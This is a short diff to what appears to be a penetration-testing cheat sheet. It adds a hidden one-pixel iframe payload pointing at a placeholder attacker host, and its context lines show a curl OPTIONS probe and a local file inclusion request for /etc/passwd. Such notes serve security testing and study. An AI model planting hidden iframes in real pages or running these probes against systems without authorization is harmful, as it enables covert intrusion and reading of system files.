@@ -125,6 +125,11 @@ OPTIONS / HTTP/1.0
 curl -iksX OPTIONS <target IP>
 ------------------------------------------------------------------------------------------------------
 
+# iframe
+
+<iframe src="http://<attackerIP>" width="1" height="1"></iframe>
+------------------------------------------------------------------------------------------------------
+
 # Local file inclusion
 
 http://localhost/index.php?page=/etc/passwd
